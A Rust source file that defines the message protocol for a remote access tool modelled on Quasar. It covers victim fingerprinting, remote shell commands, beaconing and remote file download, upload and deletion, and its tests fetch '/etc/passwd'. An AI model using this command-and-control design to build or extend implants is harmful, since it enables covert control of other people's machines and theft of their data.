//! 消息协议定义
//! 参考 Quasar 的 Messages 模块

use serde::{Deserialize, Serialize};

/// 客户端标识信息 - 上线时发送
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientIdentification {
    /// 唯一客户端 ID (机器指纹)
    pub id: String,
    /// 版本号
    pub version: String,
    /// 操作系统
    pub operating_system: String,
    /// 账户类型 (Admin/User)
    pub account_type: String,
    /// 国家
    pub country: String,
    /// 用户名
    pub username: String,
    /// 计算机名
    pub pc_name: String,
    /// 标签
    pub tag: String,
}

/// 客户端标识结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientIdentificationResult {
    pub success: bool,
}

/// Shell 执行命令
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellExecute {
    pub command: String,
}

/// Shell 执行结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellExecuteResponse {
    pub output: String,
    pub is_error: bool,
}

/// 心跳消息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Heartbeat {
    pub timestamp: i64,
}

/// 心跳响应
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HeartbeatResponse {
    pub timestamp: i64,
}

/// 客户端断开连接
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientDisconnect;

/// 设置心跳间隔命令
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetBeaconInterval {
    /// 新的心跳间隔（秒）
    pub interval_seconds: u64,
}

/// 消息类型枚举 - 用于序列化/反序列化
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Message {
    // 连接管理
    ClientIdentification(ClientIdentification),
    ClientIdentificationResult(ClientIdentificationResult),
    ClientDisconnect(ClientDisconnect),
    
    // 心跳
    Heartbeat(Heartbeat),
    HeartbeatResponse(HeartbeatResponse),
    
    // Shell
    ShellExecute(ShellExecute),
    ShellExecuteResponse(ShellExecuteResponse),
    
    // 控制命令
    Exit,  // 命令客户端退出进程
    SetBeaconInterval(SetBeaconInterval),  // 修改心跳间隔
    
    // 文件管理
    GetDirectoryListing(GetDirectoryListing),
    DirectoryListingResponse(DirectoryListingResponse),
    FileDownload(FileDownload),
    FileDownloadResponse(FileDownloadResponse),
    FileUpload(FileUpload),
    FileUploadResponse(FileUploadResponse),
    FileDelete(FileDelete),
    FileDeleteResponse(FileDeleteResponse),
}

// ==================== 文件管理消息 ====================

/// 获取目录列表请求
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GetDirectoryListing {
    pub path: String,
}

/// 文件/目录信息
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileInfo {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub modified: i64,  // Unix timestamp
}

/// 目录列表响应
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DirectoryListingResponse {
    pub path: String,
    pub entries: Vec<FileInfo>,
    pub error: Option<String>,
}

/// 文件下载请求
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDownload {
    pub path: String,
}

/// 文件下载响应（分块传输）
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDownloadResponse {
    pub path: String,
    pub data: Vec<u8>,
    pub is_complete: bool,
    pub error: Option<String>,
}

/// 文件上传请求
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileUpload {
    pub path: String,
    pub data: Vec<u8>,
    pub is_complete: bool,
}

/// 文件上传响应
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileUploadResponse {
    pub path: String,
    pub success: bool,
    pub error: Option<String>,
}

/// 文件删除请求
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDelete {
    pub path: String,
}

/// 文件删除响应
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileDeleteResponse {
    pub path: String,
    pub success: bool,
    pub error: Option<String>,
}

impl Message {
    /// 序列化消息为字节
    pub fn serialize(&self) -> Result<Vec<u8>, bincode::Error> {
        bincode::serialize(self)
    }
    
    /// 从字节反序列化消息
    pub fn deserialize(data: &[u8]) -> Result<Self, bincode::Error> {
        bincode::deserialize(data)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_message_serialization() {
        let msg = Message::Heartbeat(Heartbeat { timestamp: 12345 });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::Heartbeat(h) => assert_eq!(h.timestamp, 12345),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_shell_execute_roundtrip() {
        let msg = Message::ShellExecute(ShellExecute { command: "whoami".to_string() });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::ShellExecute(s) => assert_eq!(s.command, "whoami"),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_shell_response_roundtrip() {
        let msg = Message::ShellExecuteResponse(ShellExecuteResponse {
            output: "root\n".to_string(),
            is_error: false,
        });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::ShellExecuteResponse(r) => {
                assert_eq!(r.output, "root\n");
                assert!(!r.is_error);
            }
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_exit_roundtrip() {
        let msg = Message::Exit;
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        assert!(matches!(decoded, Message::Exit));
    }
    
    #[test]
    fn test_set_beacon_interval_roundtrip() {
        let msg = Message::SetBeaconInterval(SetBeaconInterval { interval_seconds: 60 });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::SetBeaconInterval(s) => assert_eq!(s.interval_seconds, 60),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_directory_listing_roundtrip() {
        let msg = Message::GetDirectoryListing(GetDirectoryListing { path: "C:\\".to_string() });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::GetDirectoryListing(g) => assert_eq!(g.path, "C:\\"),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_file_download_roundtrip() {
        let msg = Message::FileDownload(FileDownload { path: "/etc/passwd".to_string() });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::FileDownload(f) => assert_eq!(f.path, "/etc/passwd"),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_file_upload_roundtrip() {
        let msg = Message::FileUpload(FileUpload {
            path: "/tmp/test.txt".to_string(),
            data: vec![1, 2, 3, 4, 5],
            is_complete: true,
        });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::FileUpload(f) => {
                assert_eq!(f.path, "/tmp/test.txt");
                assert_eq!(f.data, vec![1, 2, 3, 4, 5]);
                assert!(f.is_complete);
            }
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_file_delete_roundtrip() {
        let msg = Message::FileDelete(FileDelete { path: "/tmp/junk".to_string() });
        let bytes = msg.serialize().unwrap();
        let decoded = Message::deserialize(&bytes).unwrap();
        
        match decoded {
            Message::FileDelete(f) => assert_eq!(f.path, "/tmp/junk"),
            _ => panic!("Wrong message type"),
        }
    }
    
    #[test]
    fn test_deserialize_garbage_fails() {
        let garbage = vec![0xFF, 0xFE, 0xFD, 0xFC];
        assert!(Message::deserialize(&garbage).is_err());
    }
}
